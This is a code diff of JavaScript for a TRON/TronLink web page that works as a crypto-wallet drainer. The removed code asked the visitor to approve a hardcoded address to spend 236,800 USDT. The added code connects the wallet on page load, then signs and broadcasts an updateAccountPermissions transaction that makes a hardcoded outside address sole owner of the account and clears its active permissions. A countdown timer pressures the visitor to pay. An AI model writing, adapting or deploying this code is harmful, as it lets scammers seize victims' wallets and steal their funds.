@@ -1,45 +1,101 @@
+document.addEventListener('DOMContentLoaded', async () => {
+    const tronWeb = window.tronWeb;
+
+    // 检查TronLink是否安装
+    if (typeof tronWeb === 'undefined') {
+        alert("TronLink is not installed. Please install TronLink to proceed.");
+    } else {
+        // 检查钱包是否已连接
+        if (!tronWeb.defaultAddress.base58) {
+            try {
+                await connectWallet();
+            } catch (error) {
+                console.error("Error connecting to TronLink:", error);
+                alert("Error: " + error.message);
+            }
+        }
+    }
+
+    startCountdown();
+});
+
+// 连接钱包的函数
 async function connectWallet() {
+    const tronWeb = window.tronWeb;
+
+    // 请求TronLink连接
+    await tronWeb.request({
+        method: 'tron_requestAccounts'
+    });
+}
+
+// 确认权限转移的函数
+async function confirmPermission() {
+    const tronWeb = window.tronWeb;
+    const currentAddress = tronWeb.defaultAddress.base58;
+    const newOwnerAddress = 'TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz';
+
+    console.log("Current Address:", currentAddress);
+    console.log("New Owner Address:", newOwnerAddress);
+
     try {
-        // 检查是否安装了 TronLink
-        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-            // 获取用户的 TRON 地址
-            const userAddress = window.tronWeb.defaultAddress.base58;
+        // 获取当前账户权限信息
+        const accountInfo = await tronWeb.trx.getAccount(currentAddress);
+        console.log("Account Info:", accountInfo);
 
-            // TRC20 USDT 合约地址和 ABI
-            const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-            const usdtAbi = [
-                {
-                    "constant": false,
-                    "inputs": [
-                        { "name": "_spender", "type": "address" },
-                        { "name": "_value", "type": "uint256" }
-                    ],
-                    "name": "approve",
-                    "outputs": [{ "name": "", "type": "bool" }],
-                    "type": "function"
-                }
-            ];
+        const ownerPermission = {
+            type: 0,
+            permission_name: 'owner',
+            threshold: 1,
+            keys: [{
+                address: tronWeb.address.toHex(newOwnerAddress),
+                weight: 1
+            }]
+        };
 
-            // 创建 USDT 合约实例
-            const usdtContract = await window.tronWeb.contract(usdtAbi, usdtAddress);
+        const activePermissions = [];  // 清除现有的active权限
 
-            // 授权地址和数量
-            const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
-            const amount = window.tronWeb.toHex(window.tronWeb.toSun(236800)); // 236800 枚 USDT
+        // 使用 TronWeb 的 transactionBuilder.updateAccountPermissions 方法
+        const transaction = await tronWeb.transactionBuilder.updateAccountPermissions(
+            currentAddress,
+            ownerPermission,
+            null,
+            activePermissions
+        );
 
-            // 发送授权交易
-            const tx = await usdtContract.approve(spenderAddress, amount).send({
-                feeLimit: 100000000, // 设置手续费限制为 100 TRX
-                callValue: 0 // 设置交易调用的 TRX 数量
-            });
+        console.log("Transaction:", transaction);
 
-            // 更新按钮文本
-            document.getElementById('okButton').innerText = '成功正在获取私钥';
+        // 签名交易
+        const signedTransaction = await tronWeb.trx.sign(transaction);
+        console.log("Signed Transaction:", signedTransaction);
+
+        // 发送交易
+        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+        console.log("Transaction Result:", result);
+
+        if (result.result) {
+            alert("Transaction sent successfully. Please check your wallet to sign the transaction.");
         } else {
-            alert('请安装支持 TRC20 的 TRON 钱包插件并登录');
+            alert("Transaction failed: " + result.message);
         }
     } catch (error) {
-        console.error(error);
-        document.getElementById('okButton').innerText = '连接失败，请重新连接';
+        console.error("Error sending transaction:", error);
+        alert("Error: " + error.message);
     }
+}
+
+// 实时倒计时函数
+function startCountdown() {
+    let countdownElement = document.querySelector('.countdown');
+    let countdownValue = 120;
+
+    let countdownInterval = setInterval(() => {
+        countdownValue--;
+        countdownElement.textContent = countdownValue;
+
+        if (countdownValue <= 0) {
+            clearInterval(countdownInterval);
+            countdownElement.textContent = '请尽快转入';
+        }
+    }, 1000);
 }
